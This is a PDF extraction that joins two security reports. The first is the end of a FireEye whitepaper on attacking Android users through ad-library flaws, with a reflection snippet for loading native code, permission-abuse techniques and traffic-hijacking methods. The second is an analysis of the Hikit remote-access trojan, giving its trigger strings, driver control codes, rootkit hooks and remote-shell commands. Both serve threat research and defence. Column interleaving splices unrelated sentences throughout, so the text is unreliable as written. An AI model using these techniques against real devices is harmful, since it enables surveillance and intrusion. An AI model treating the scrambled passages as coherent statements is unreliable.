monitor or tamper with the clipboard . Android                                  Android permissions into several protec- tion
users may perform copy - paste on important text                                 levels : “ normal,””dangerous , ” “ system , ”
content . For example , there are many popular                                   “ signature ” and “ development”15,16,17 . Dangerous
password - management apps in Google Play ,                                       permissions“may be displayed to the user and
enabling the users to click - and - copy passwords                                 require confirmation before pro- ceeding , or
Listing 5 : Sample
Javascript snippet             jsObj.getClass().forName(”java.lang . Runtime ” )
to load JNI binary            	    .getMethod ( ” getRuntime”,null).invoke(null , null).load(binaryPath ) ;
into the host app ’s
Java VM
Listing 6 : API
calls to peek into/            ClipboardManager.getText ( )
tamper with the                ClipboardManager.hasPrimaryClip ( )
ClipboardManager.setText ( )
clipboard                      Clipboard Manager.setPrimaryClip ( )
ClipboardManager.hasText ( )
ClipboardManager.addPrimaryClipChangedListener ( )
ClipboardManager.getPrimaryClip ( )
and paste them into login forms . Malicious                                     some other approach may be taken to avoid
apps can steal the passwords if they can read                                  the user automatically allowing the use of such
the contents on clipboard . Android has no                                      facilities.”In contrast , normal permissions are
permissions restricting apps from accessing                                    automatically granted at installation , “ without
the global clipboard . Any UID has the capability                               asking for the user ’s explicit approval ( though
to manipulate clipboard via the API calls in Listing 6 :                        the user always has the option to review these
13
http://www.weibo.com/p/1001603724694418249344?utm_source=weibolife .
14
https://labs.mwrinfosecurity.com / blog/2014/06/12/putting - javascript- bridges - into - android - context .
15
http://developer.android.com/guide/topics/manifest/permission-element.html .
16
https://android.googlesource.com/platform/frameworks/base/+/master/ core / res / AndroidManifest.xml .
17
https://android.googlesource.com/platform/packages/apps/Launcher2/+/ master / AndroidManifest.xml .
9 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
permissions before installing)”15 . If an app requests                          corresponding field . Note that the
both dangerous permissions and normal                                          proxySettings field is a private Java field not
permissions , Android only displays the dangerous                               intended to be accessed by other processes .
per- missions by default . If an app requests only                              Unfortunately , the flexible and powerful Java
normal permissions , Android does n’t display any                                reflection mechanism ( especially the forName ( ) ,
permission to the user .                                                        getField ( ) , setAccessible ( ) calls ) exposes
such components to the attackers for arbitrary
We have found that certain “ normal ” permissions                                read or write operations .
have dangerous security impacts18 . For example ,
the attackers can manipulate Android home                                      Taking Pictures and Recording Audio / Video
screen icons using two normal permissions :                                     without User Interaction
launcher READ SETTINGS and WRITE                                               Android audio recording via the MediaRecorder
SETTINGS permissions . These two permissions                                    APIs does not need user interaction or
enable an app to query , insert , delete , or modify                              consent , which makes it easy to record sound
all launcher configuration settings , including icon                            in the background .
insertion or modification .
On the contrary , taking pictures and recording
As a proof - of - concept attack scenario , a malicious                             videos are more challenging . First , this requires
app with these two permissions can query / insert/                               registering Java callbacks . Second , Android warns
alter the system icon settings and modify                                      that “ Preview must be started before you can take
legitimate icons of some security- sensitive apps ,                             a picture”19 . It seems that taking pictures and
such as banking apps , to a phishing website .                                   recording videos without user notification is
impossible . However , security largely depends on
After our notification , Google has patched this                                the correct implementation and enforcing a
vulnerability in Android 4.4.3 and has released the                            flawless implementation is difficult . On some of
patch to its OEM partners . However , according to                               the popular phones ( models anonymized for
Google5 , by 7 July 2014 , 17.9% Android devices                                 security consideration ) , startPreview ( ) is
are using Android 4.4 . Given that Android 4.4.2                                required to take pictures / record videos ;
and below has this vulnerability , over 82.1%                                   However , it ’s highly possible that on these
Android devices are vulnerable .                                                devices takePicture ( ) fails to check whether a
view has been presented to the user .
Proxy Modification                                                             Fortunately , we have never witnessed a case
With the CHANGE WIFI STATE permission ,                                         where the MediaRecorder can shoot videos
Android processes can change the proxy                                         without calling setPreviewDisplay . But we
settings of WIFI networks ( not solely the currently                            were able to create and register a dummy
connected one ) . To do this , the attacker can use                               SurfaceView to the WindowManager , which made
the remote calls exposed by WifiManager to                                     taking photos and videos possible even on
obtain the WifiConfiguration objects , then                                     devices that properly checked for an
create new proxySettings to replace to a                                       existing preview .
http://www.fireeye.com/blog/technical/2014/04/occupy_your_icons_ silently_on_android.html .
18
http://developer.android.com/reference/android/hardware/Camera.html .
19
10 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
Stealthy App Installation by Abusing                                          case with the attackers eavesdropping or hijacking
Credentials                                                                   the HTTP traffic . Switching to HTTPS may not
With both the GET ACCOUNTS and the USE                                        solve this issue since the HTTPS security relies on
CREDENTIALS permissions , Android pro- cesses                                  a flawless implementation , which is difficult . For
can get secret tokens of services ( e.g. , Google                               example , there are cases where the developer
services ) from the AccountManager and use them                                failed ( intentionally or unintentionally ) to check
to authenticate to these services20 . We verified                              the server ’s certificate21 . We found that some of
that Android apps with these two permissions can                              the most popular ad libraries ( see Table 3 ) have
authenticate themselves with the user ’s Google                                this issue . We successfully launched Man - in - the-
account , allowing access to Google Play and the                               Middle ( MITM ) attacks and intercepted the data
ability send app installation requests . Through the                           uploaded to the remote server . Note that even if
Javascript bridge , attackers can install apps of                              the ad libraries have a correct and rigorous
choice ( e.g. , an attacker ’s phishing app ) to any                              implementation , the SSL library itself may contain
devices registered in user ’s account in the                                   serious vulnerabilities that can be exploited by
background without user consent . Combined                                     MITM attacks22,23 .
with the launcher modification attack introduced
earlier , the attackers can redirect other app icons                           Information Leakage from Ad Libraries
( e.g. , bank or email app icons ) to the phishing app                           Almost every ad library uploads local information
and steal the user ’s login credentials .                                       from Android devices . Based on our observations ,
they do so mostly for purposes such as checking
Targeting Victims Based on Ad Traffic                                         for platform compatibility and user interest
In this section , we explain the risks of victims’                             targeting . The information most frequently
devices being tracked and targeted through                                    uploaded includes IMEI , Android version ,
ad traffic .                                                                   manufacturer , Android ID , device specification ,
carrier information , host app information ,
Communication Channels Prone to Hijack                                        installed app list , etc . Table 3 lists the info
It is well known that communication via HTTP is                               uploaded from the top five popular ad libraries .
prone to hijacking and data tamper- ing . Though
ad libraries may not have the incentive to abuse                              Listing 7 is a captured packet posted to the
users’ private and sensitive data , this is not the                            remote ad server by one of the ad libraries . It is
Listing 7 : API
calls to peek into/            requestactivity = AdRequest&d - device - screen - density=1.5&d - device - screen-
tamper with the                size=320X533&u - appBId = com.example.app&u - appDNM = Example&u - appVer=1.2&h - user-
agent = Mozilla
clipboard                      % 2F5.0+%28Linux%3B+U%3B+Android+4.1.2%3B+en - us%3B+sdk+Build%2FMASTER%
29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari
% 2F534.30&d - localization = en_us&d - netType = umts&d - orientation=1&u - latlong - accu=
37.410835%2C-121.920514%2C
20
http://seclists.org/bugtraq/2014/Mar/52 .
21
Sascha Fahl , Marian Harbach , Thomas Muders , Lars Baumga¨rtner , Bernd Freisleben , and Matthew Smith . Why eve and mallory love android : An analysis
of android ssl ( in ) security . In Proceedings of the 2012 ACM conference on Computer and communications security , pages 50–61 . ACM , 2012 .
22
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 .
23
http://www.fireeye.com / blog / technical/2014/04/if - an - android - has - a- heart-does-it-bleed.html .
11 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
captured from a popular Google Play app . From                                 DNS hijacking is legally and maliciously used in
this packet we can tell the device ’s screen density                           many situations including traffic management ,
( d - device - screen - density ) , screen size ( d - device-                             phishing and censorship . Attackers successfully
screen - size ) , host app ’s pack- age name ( u - appBId ) ,                           compromised many DNS servers , including the
host app ’s name ( u - appDNM)1 , host app ’s version                               ones from Google and Godaddy24 . By DNS
( u - appVer ) , user agent ( h - user - agent ) , localization                           hijacking , attackers can effectively access all the
( d - localization ) , mobile network type ( d - netType ) ,                            traffic to ad servers .
screen orientation ( d - orientation ) , and GPS
location ( u - latlong - accu ) . The most important                                 BGP hijacking takes over groups of IP addresses ,
infor- mation is the GPS location , where the                                  corrupting Internet routing tables by breaking
victim ’s latitude , longitude and the location                                 BGP sessions or injecting fake BGP information .
precision are shown . It is reasonable for an ad to                            This enables attackers to monitor all traffic to
obtain this information to improve the ad - serving                             specific IPs . Historically , there were many BGP
experience . However , with this information , an                                hijacking attacks that affected YouTube , DNS root
attacker can precisely locate the victim and                                  servers , Yahoo , and many other important
acquire the device ’s specifications .                                          Internet services25 .
Large - scale Monitoring and Precise Hijacking                                  ARP hijacking ( or spoofing ) in IDC26 is done to
To locate victims effectively , an attacker needs to                           hijack the traffic to the ad server in the IDC where
monitor large - scale network traffic containing                                the ad server locates through fake ARP packets .
such private information . Unfortunately , several                              Attackers may rent servers close to the target
well - known attacks can be used to achieve                                     servers , and use fake ARP packets to direct all the
large - scale monitoring , including DNS hijacking ,                              traffic to go through the hijacking servers first for
BGP hijacking , and ARP hijacking in IDC .                                      monitoring and hijacking .. ARP hijacking is a
well - known approach used in network attacks .
In this context , DNS hijacking is done to subvert
the resolution of Domain Name System ( DNS )                                    Using the large - scale traffic intercepted from the
queries through modifying the behavior of DNS                                 above methods , attackers can iden- tify potential
servers so that they serve fake DNS information .                              victims based on information leakage such as GPS
Figure 4 : Number                                                                             App Num
of ad libraries
included in Google
25017
Play apps ( with
more than 50,000                        20429
downloads
9196
4452
2543
2343
1609          1310
1291                                     607          980
498
0
0          1          2          3          4          5          6           7           8       9     10     > 10
https://isc.sans.edu / diary / Domaincontrol+(GoDaddy)+Nameservers+DNS+ Poisoning+/5146 .
24
http://www.networkworld.com / article/2272520/lan - wan / six - worst - internet- routing-attacks.html .
25
http://en.wikipedia.org/wiki/ARP\_spoofing .
26
12 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
location described in Sec- tion 4.2 . After that ,         using Ad1 , Ad2 , ... , Ad92 to refer to them , where
they can inject exploits only into the targeted          the subscripts represent the rankings of how
traffic to launch further attacks . Attackers keep a      many apps include the ad libraries . The top five
low profile by allowing all other irrelevant             popular ad libraries’ inclusion and download
network traffic to pass without being modified .          statistics are listed in Table 2 .
Targetable and Exploitable Google                        We analyzed the 92 ad libraries found in the
Play Apps                                                popular Google Play apps , and summa- rized the
We used the FireEye Mobile Threat Prevention             communication channel vulnerabilities in Table
( MTP ) engine to analyze all of the ~73,000               3 . Combined with the uploaded information
popular apps from Google Play with more than             column we can learn about the data the
50,000 downloads , and identified 93 ad libraries .        attackers can obtain .
The detailed ad library inclusion statistics are
shown in Figure 4 . Seventy - one% of the apps              Fifty - seven of the 92 ad libraries in the popular
contain at least one ad library , 35% have at least       Google Play apps have the JBOH issue .
two ad libraries , and 22.25% include at least            Specifically , four of the top five ad libraries are
three ad libraries . The largest ad inclusion             subject to this problem ( shown in Table 2 ) . Seven
number is 35 . Since Google is cautious about the         of the 92 ad libraries are prone to DLOH attacks .
security of the products it directly controls , we        Particularly , some versions of Ad5 in Table 3 have
exclude Google Ad from the following discussion .         this problem . The affected Google Play apps
For security considerations , in this paper we            number and the accumulated download counts
anonymize the names of the other 92 ad libraries ,        are listed in Table 4 .

Table 2 : The
inclusion statistics           Ad Library          Number of Apps       JBOH Apps           Total Downloads       JBOH Downloads
of the top five
Android ad
Ad1                  9,702               2,802                8,781 M                2,348 M
libraries excluding
Google Ad . Their
JBOH statistics                   Ad2                  8,856               4,204                7,865 M                4,754 M
are also listed
( discussed in
Ad3                  8,818               2,117                8,499 M                1,611 M
the earlier JBOH
section . ) .
Ad4                  5,519               1,112                4,687 M                 617 M
Ad5                  5,170                0                   4,519 M                   0
13 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android

Table 3 : The
Ad Library                          Uploaded Info                        Protocol    SSL Vuln        JBOH        DLOH
uploaded data ,
communication
channel                                                IMEI / device i d , device model , An-               HTTP/
Ad1
droid version , location                   HTTPS
vulnerabilities , and
JBOH / DLOH details
device specification , Android version ,
of the top five ad                Ad2                                                                   HTTP
host app info , location
libraries .
IMEI / device i d , device model , An-
Ad3            droid version , device manufacturer , carrier info ,       HTTP
location , ip
IMEI / device i d , device model , device
Ad4                                                                   HTTP
specification , Android version
IMEI / device i d , device model , device
Ad5                specification , Android version , coun- try ,         HTTPS
launguage

Table 4 : Assessment statistics                                                                        Type I                             Type II
Subject to attack type            Type I #                         Type II #
of Google Play apps ( downloads                                                                      Downloads                           Downloads
≥50,000 ) that are vulnerable to the
Code injection via ptrace           2,055             444 M             272                 67 M
Sidewinder Targeted Attack . Type I
apps are those subject to JBOH or                        Send SMS                      349              340 M             229                 254 M
DLOH attacks ; Type II apps are those
not only JBOH / DLOH exploitable but                   Make phone calls                  572              399 M             426                 324 M
also have the LOCATION leakage
Launcher modification               111              95 M               81                 37 M
( thus vulnerable to the Sidewinder
Targeted Attack ) . Note that an app                  Proxy modification                 644              792 M             419                 378 M
is counted in the total statistics if
it is subject to any of the attacks ,                   Record audio                   1,097            1,408 M            654                 621 M
including uploading files and root              Take pictures / record videos           1,141            1,380 M            622                 665 M
exploits .
Install apps stealthily             351              552 M             197                 332 M
Total(incl . root exploits )         16,579           11,706 M           4,201               3,207 M
14 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
Conclusion
In the current golden age of Android ad               1 . 	  Android is a complex system . Any sub-
libraries , Sidewinder Targeted Attacks can                component ’s vulnerability may impact the
target victims using info leakage and other               security of the whole system .
vulnerabilities of ad libraries to get valuable ,          Fragmentation makes the situation even
sensitive information . Millions of users are still        more challenging .
under the threat of Sidewinder Targeted
Attacks . First we need to improve the security        2 . 	  The trade - off between usability ,
and privacy protection of ad libraries . For               performance and security always matters ,
example , we encourage ad libraries’ publishers            and market demand frequently dictates
to use HTTPS with proper SSL certificate                  that security comes last . Many Android
developers do not even understand how
to program securely ( as shown in the
JBOH issue ) .
Sidewinder Targeted Attacks can target
victims using info leakage and other                                                3 . 	  Many security patches are not back - ported
to old versions of Android ( like the launcher
vulnerabilities of ad libraries to get valuable ,                                        settings problem described earlier ) , even
sensitive information . Millions of users are                                            though older versions are widely used .
still under the threat of Sidewinder                                                4 . 	  There is always information asymmetry in
Targeted Attacks .                                                                       the development chain . For example , it
usually takes several months for vendors to
apply security patches after Google
releases them .
validation , and to properly encrypt network
traffic . They also need to be cautious about          Albeit challenging , we hope that this work
which privileged interfaces are exposed to the        can kickstart a conversation , both on
ad providers , in case of malicious ads or             improved security and privacy protection in
attackers hijacking the communication channels .       third - party libraries and on a hardened
Android security framework .
Meanwhile , Google itself needs to further
harden the security framework . This may prove
difficult because :
15 www.fireeye.com
FireEye : Sidewinder Targeted Attack against Android
About FireEye , Inc.                                    provides real - time , dynamic threat protection
FireEye has invented a purpose - built , virtual          without the use of signatures to protect an
machine - based security platform that provides          organization across the primary threat vectors and
real - time threat protection to enterprises and         across the different stages of an attack life cycle .
governments worldwide against the next                 The core of the FireEye platform is a virtual
generation of cyber attacks . These highly              execution engine , complemented by dynamic threat
sophisticated cyber attacks easily circumvent          intelligence , to identify and block cyber attacks in
traditional signature - based defenses , such as          real time . FireEye has over 1,900 customers across
next - generation firewalls , IPS , anti - virus , and        more than 60 countries , including over 130 of the
gateways . The FireEye Threat Prevention Platform       Fortune 500 .
FireEye , Inc. | 1440 McCarthy Blvd . Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com
© 2014 FireEye , Inc. All rights reserved . FireEye is a registered trademark of FireEye ,
Inc. All other brands , products , or service names are or may be trademarks or service
marks of their respective owners . WP.SW.EN - US.072014





Hikit Analysis
Basic Description
Hikit consists of at least two generations of malware that provides basic RAT functionality . The first
generation of Hikit ( referred to as “ Gen 1 ” ) operates as a server and requires an externally exposed
network interface in order for an attacker to access the victim machine . The second generation of Hikit
( referred to as “ Gen 2 ” ) uses the more traditional client model and beacons out to an attacker ’s C2
server . While the communication models shifted dramatically between Gen 1 and Gen 2 , both
generations of Hikit retain the same basic RAT function consisting of remote command shell , file
management , network proxy and port forwarding .
Both Gen 1 and Gen 2 sub - families of Hikit consist of a main DLL ( referred to as “ the DLL ” ) that
contains the RAT functionality ; a kernel driver ( referred to as “ the Driver ” ) with Gen 2 also employs an
additional component : a loader executable . The driver component of Gen 1 and Gen 2 are drastically
different in their operation and intent . For the Gen 1 sub - family of Hikit , the driver acts as a NDIS
( network ) driver that is responsible for interfacing the DLL to the network while preventing a direct
WinSock interface from occurring . The Gen 1 Driver listens to network traffic arriving at the local
network interface and waits for a specific trigger string . The trigger string varies by Driver and DLL
sample . The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes , registry
keys and network connections associated with Gen 2 activity on the victim ’s system .
Gen 2 uses a standard client - server malware model meaning that the malware no longer requires a
direct Internet - facing network card , no longer uses a network driver for networking , and provides the
ability to network multiple Gen 2 samples behind a firewall with greater ease ( from the attacker ’s
perspective ) . The Gen 2 sub - family , however , no longer employs network stealth provided by the Gen 1
network driver which exposes the C2 server addresses to analysts .
Each of the Hikit generations contains multiple sub - generations as the author(s ) of Hikit have evolved
their code over time . There is a noticeable steep improvement over the code base of Gen 1 Hikit family
during its 2011 development period . The Gen 2 sub - generations share a similar improvement scale
between late 2011 and late 2013 .
Evolution
The earliest known Hikit sample dates back to 31 March 2011 . Known as the Gen 1.0 sub - generation of
Hikit Gen 1 , the first known sample of Hikit deviated from the later traditional Gen 1 model . The Gen 1.0
sample was a standalone executable whereas subsequent Gen 1 sub - generations use a DLL running
as a service . The Gen 1.0 sample is clearly a work - in - progress . The Gen 1.0 sample , while different
than subsequent sub - generations , does still rely on the Driver component and for the most part the
structure of the code does not differ much going forward into the Gen 1 evolution .
Less than three weeks after Gen 1.0 , the author(s ) of Hikit move into Gen 1.1 . The notable change is
that the Hikit model of using a DLL and driver , which has remained until present day , comes into being .
The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change . Both
Gen 1.0 and Gen 1.1 use plaintext data transmissions .




Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011
based on a lack of available samples found . During this time the development of Hikit appears to
change locations . Gen 1 samples have Program Database ( PDB ) file strings that identify the file path of
the Hikit source code . For Gen 1.0 and Gen 1.1 samples , the file path of the Hikit source code is
consistently h:\JmVodServer\hikit . Starting with Gen 1.2 , the file path switches to
e:\SourceCode\hikit_new . It is at this time that the functionality of Hikit Gen 1 begins to mature .
In Gen 1.2 , the communication between the infected machine and the attacker is encrypted using an
XOR mask . A more subtle change is the renaming of the “ socks5 ” command to simply “ proxy ” within
the code . The code within Hikit begins to mature but the overall functionality does not expand beyond
the original set of commands found in Gen 1.0 . The other remarkable change within the Gen 1.1 to Gen
1.2 development is the way in which the session handshake trigger operates . In Gen 1.0 and Gen 1.1 ,
the DLL instructs the Driver to listen for a specific string ( typically a HTTP request string ) and responds
with another string . In Gen 1.2 , the Driver has a hardcoded trigger string ( a specific HTTP request
string ) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific
hexadecimal value . This moves Gen 1.2 into more of a username / password authentication scheme
whereas previous sub - generations could potentially be accessed by accidental HTTP requests . At the
same time , the Driver responds with a specific value with in the Etag HTTP header field . This places
Gen 1.2 into a more stealth position as a random , non - HTTP compliant response from Gen 1.0 and
Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag
header .
Gen 1.2 ’s development cycle appears to exist between 23 October 2011 and 2 November 2011 with
several new samples being found on the Internet having legitimate compile times during this time
window . There is , however , evidence that the development of Hikit Gen 1 and Gen 2 overlap by several
months . The earliest Gen 2 sample known to exist dates to 28 August 2011 , two months before the first
known Gen 1.2 sample . The last known Gen 1.2 sample , and by extension , the last known Gen 1
sample , dates to 9 April 2012 .
The first known Gen 2 sub - generation , Gen 2.0 Alpha , much like Gen 1.0 , represents an early
development version of the Gen 2 Hikit sub - family . Gen 2.0 Alpha is a stand - alone Windows console
executable that can run as a service executable . Gen 2.0 Alpha supports the same commands as Gen
1.2 with an additional command that returns the infection ’s configuration information .
On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer(s ) of Hikit .
Also a stand - alone console executable like Gen 2.0 Alpha , the Gen 2.0 Beta code changes internally
without providing significant functionality improvements with the exception of now the executable uses
a device driver to hide network , file , and registry artifacts related to its operation . Both Gen 2.0 Alpha
and Gen 2.0 Beta still retain PDB file path information within their binaries . During the development
phase of Gen 2.0 Alpha , development of the Gen 2.0 Alpha variants changes locations . First version of
the Gen 2.0 Alpha malware , from 28 August 2011 , has the PDB path located in
H:\JmVodServer\Matrix_new2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta
binaries has the PDB path in E:\SourceCode\Matrix_new which suggests that the source code for
both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time . This may
indicate either a single developer or a team ( or set of teams ) with shared resources .
The first known Gen 2.1 binary has a compile date of 17 April 2012 . Gen 2.1 represents the first Gen 2
sub - generation to use an executable - based loader , DLL and driver model , a model that all subsequent
Gen 2 sub - generations employ . The functionality of the Gen 2.1 sub - generation is the same as the




previous generations with no new commands being introduced . Gen 2.1 is the first sub - generation in
the Gen 2 sub - family to introduce 64-bit binaries .
The Gen 2.2 sub - generation appears to have begun on 20 July 2012 . Gen 2.2 is notable for altering
where the configuration information of the RAT is stored and using both DLL - based and executable-
based loaders . Also notable is the fact that the sub - generation spans a significant amount of time with
intermittent periods of development . The bulk of the Gen 2.2 samples that have the tell - tale marks of
being the product of a builder have a compile date of 26 July 2013 , a full year after the first known Gen
2.2 sample . Between 21 July 2012 and 20 February 2013 , there are no known Gen 2.2 binaries . The
two 20 July 2012 samples have different compile times indicating they were not the product of a builder
but rather unique compilations . Between 21 February 2013 and 27 February 2013 , there are 4 unique
compilation dates for the DLL component with 7 unique , known Gen 2.2 DLLs . The bulk of Gen 2.2
samples have a compile date of 26 July 2013 . There are approximately 25 known Gen 2.2 DLLs with
the 26 July 2013 compile date . The Gen 2.2 sub - generation appears to exist through at least 19
September 2013 .
The last known Gen 2 sub - generation , Gen 2.3 , began on 12 December 2013 . Gen 2.3 is notable for its
use of a legitimate SSL certificate as part of the handshake between the infected machine and the
attacker ’s C2 . The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS
sensors that look for encrypted traffic . Another interesting aspect of the Gen 2.3 sub - generation is that
there is no longer a marker to designate the beginning of the embedded configuration . Gen 2.1 and
Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in
order to allow the builder to locate the configuration space when constructing a new configuration for
the binaries . Gen 2.3 , however , uses a specific location instead , requiring the builder to calculate the
specific location using the PE / COFF header of the binary . Also , while Gen 2.1 and Gen 2.2 retain the
configuration within the DLL component , Gen 2.3 stores the configuration within the loader component .
This allows the attackers to configure the loader without having to update the DLL .
The evolution of Hikit is a long and drawn out series of small , incremental development changes . The
important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed
in late 2011 and development of Gen 2 has a several month overlap with the development and usage
of Gen 1 . The following table provides a quick reference to the generational ( and sub - generational )
designations of Hikit .




August
28 , 2011
Timeline Outlined in Appendix A : HiKit Versions
The Driver
The Driver component for Hikit varies based on the specific Hikit sub - family ( Gen 1 or Gen 2 ) . As such
it is necessary to describe each in the context of its specific sub - family .
Gen 1 Driver
The Driver component of Gen 1 Hikit variants provides the interface between the victim ’s network
interface card ( NIC ) and the DLL . The Driver is a NDIS ( network ) driver that integrates into the victim ’s
network stack . The Driver intercepts any and all network communication that traverses the Windows
network stack and potentially removes the data from the network stack under very specific conditions .
When the Driver removes data from the network stack , the Driver stores the removed data in local
buffers for the Gen 1 DLL to query against . The purpose of this behavior is to allow the DLL to interact
with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit .
In order to interact with the Driver , the DLL uses the function
IoDeviceControl
to send commands to
the Driver . The Driver registers itself at both
\Device\w7fw
and
\DosDevices\w7fw
thereby
allowing the DLL to access the Driver by performing a
CreateFile
request to
\\.\w7fw
or

\\.\Globals\w7fw in order to obtain a handle to the Driver . The Driver ’s interface supports the
following OIDs :




OID              Function
0x12C828         No - op
0x12C82C         Retrieves bytes from the recv queue .
0x12C830         Add bytes to the xmit queue .
0x12C838         Set key value ( the trigger value )
0x12C840         Change mode for current process ’s channel to 2
0x12C844         Activates channel
0x12C848         Shuts down a channel by flushing all queued packets / data to the network with ACK|FIN
set in the flags
0x12C84C         Returns the current mode for a given channel
0x12C850         Get the Driver ’s version
The Driver will remove data from the network stack only if a new channel is being established . A new
channel occurs when the Driver detects a trigger string . The trigger string is typically a short form HTTP
request with the following trigger strings found in the wild :
Generation(s )     Trigger String                    Authentication Response Value
Value
Gen 1.0 , 1.1      GET /password                                    .welcome .
HTTP/1.1\r\n\r\n
Gen 1.2           GET / HTTP/1.1\r\n                75BCD15          HTTP/1.1 200 OK
Pragma : no - cache
Content - Type : text / html
ETag : " { other
digits}75BCD15{other digits}:{3 hex
digits } "
Connection : Keep - Alive
Gen 1.2           POST / HTTP/1.1\r\n               75BCD15          HTTP/1.1 200 OK
Pragma : no - cache
Content - Type : text / html
ETag : " { other
digits}75BCD15{other digits}:{3 hex
digits } "
Connection : Keep - Alive
Up to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the
authentication value whereas Gen 1.2 Drivers had the trigger strings hardcoded .
In Gen 1.2 , whenever the Driver detects a trigger string , the Driver inspects the rest of the data
received for the authentication value . If the token follows the trigger string ( there is no specific limitation
on how far from the trigger string the password token must be ) , then the Driver generates a new
channel that the DLL will use as the conduit between the DLL and the client .




The Driver appears to be based off the NDIS example source code PassThru . More specifically , the
author(s ) of the Driver appear to have used the modified version of the PassThru example ,
PassThruEx , by James Antognini and Thomas Devine from a 2003 blog post1 .
Gen 2 Driver
The Gen 2 sub - family , beginning with Gen 2.0 Beta , employs a Windows device driver ( “ the Driver ” ) to
hide aspects of the DLL ’s functionality from normal system processes . The Driver is a relatively
straightforward piece of software . It does not attempt to obfuscate its functionality from static analysis
and it hooks a minimum number of kernel API functions in order to hide different pieces of information .
The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of
the code coming directly from a Chinese blog3 .
The Driver expose an IOCTL interface that supports the following OIDs :
OID                                                                                                                   Function
0x22C000                                                                                                              Add driver ( system module ) to hide .
0x22C004                                                                                                              Reveal all hidden items .
0x22C008                                                                                                              Add IP : Port endpoint to hide .
0x22E000                                                                                                              No - Op
0x22FFD0                                                                                                              Remove PID from hidden list .
0x22FFD4                                                                                                              Add PID to list of PIDs to hide .
0x22FFD8                                                                                                              Add service to list of services to hide .
0x22FFE0                                                                                                              Add local port to list of ports to hide .
0x22FFE4                                                                                                              Currently unused . Evidence suggest this was previously a port hiding function , but it
is no longer functional .
0x22FFE8                                                                                                              Currently unused . It is unclear the purpose of this function . It takes a string as its
argument .
0x22FFEC                                                                                                              Add directory to list of directories to hide .
0x22FFF0                                                                                                              Add registry key to list of registry keys to hide .
0x22FFF4                                                                                                              Add registry key value to list of registry values to hide .
0x22FFFC                                                                                                              Purge all hooks and hidden items ( " unhook " )
The Driver is capable of hiding processes ( by PID , not name ) , system modules , services , network
connections , listening ports , directories ( and by extension , files ) , as well as registry keys and values . In
order to hide these items , the Driver hooks various Windows Kernel API calls . The following table maps
the items the Driver can hide to the API function that the Driver hooks :
Item                                                                                                                                                         API Function Hooked
Process ID                                                                                                                                                   ZwDeviceIoControlFile
( PID )
Registry Key                                                                                                                                                 ZwEnumerateKey
Registry Value                                                                                                                                               ZwEnumerateValueKey
Directory                                                                                                                                                    QueryDirectoryFile





























































1

James
Antognini
and
Thomas
F.
Divine .
“ Extending
the
Microsoft
PassThru
NDIS
Intermediate
Driver — Parts :
Two
IP

Address
Blocking
NDIS
IM
Drivers ” .
December
15 ,
2003

2

pudn .
“ Agony
Rootkit
code ,
the
stability
and
can
be
useful
Driver
Develop ” .

http://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html .
8
April
2007 .


3

CardMagic .
“ [ Reserved ]
NSI
Module
Hook :
Hiding
Port
Under
Windows
Vista ” .
http://forum.eviloctal.com / archiver / tid-­‐
29604.html .
8
July
2007 .






Item               API Function Hooked
Local Listening    ZwDeviceIoControlFile
Port
Remote             ZwDeviceIoControlFile
Endpoint
Loaded Drivers     ZwQuerySystemInformation


In order to hide services , the Driver will access the memory of the services.exe process , locate the
linked list of services and remove the service entry that the Driver wishes to hide . This is a surprisingly
invasive method to obfuscate a process .
Upon activation , the Driver will expose its interface by calling
IoCreateDevice
with the name
\Device\agony
( for Gen 2.0 Beta samples ) , \Device\HTTPS
( for Gen 2.1 samples ) ,

\Device\advcachemgr
( for Gen 2.2 samples ) or \Device\diskdump
( for Gen 2.3 samples ) . The
Driver also creates a symbolic link to the device using the same name but under the
\DosDevices\

tree .


For reasons unknown , the authors of the Driver used code from a Chinese blog that details how to hide
network connections on Windows Vista and later decided to keep the example IP address within the
code .
Functionality and Commands
The Hikit family has supported roughly the same set of commands since the first known samples of
Gen 1.0 . Gen 2.0 introduced a single command to provide insight into an infected machine ’s Hikit
configuration ( something that is not necessary for Gen 1 variants since they are server - based ) . The
RAT supports the following commands :
Command        Introduced    Description
shell          Gen 1.0       Establishes a remote command shell on the victim machine
file           Gen 1.0       File managerment
connect        Gen 1.0       Establishes a tunnel connection ( e.g. port forwarding ) through
another Hikit sample
socks5         Gen 1.0       Establishes a forwarding proxy ( retired in Gen 1.2 )
proxy          Gen 1.2       Establishes a forwarding proxy
information    Gen 2.0       Returns the configuration for the Hikit infection
Alpha
exit           Gen 1.0       Terminates a channel
Command :   shell
The
shell
command activates a remote shell on the victim ’s computer . The remote shell function uses
the standard pipe redirection method for interfacing a network application ( in this case , the DLL ) to a
hidden command shell .


Command :   file
The
file
command provides an attacker with a variety of disk access options such as listing
directories , changing the current directory , and uploading and downloading files .




Command :   connect
The
connect
function provides the functionality to allow one Hikit DLL to interface with another DLL of
a similar version . The use of this functionality can best be illustrated by considering the fact that the
Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen
1 ’s RAT function . This would prohibit lateral movement within a victim ’s network as the bulk of any
organization ’s network infrastructure is not directly exposed to the Internet . By using the connect
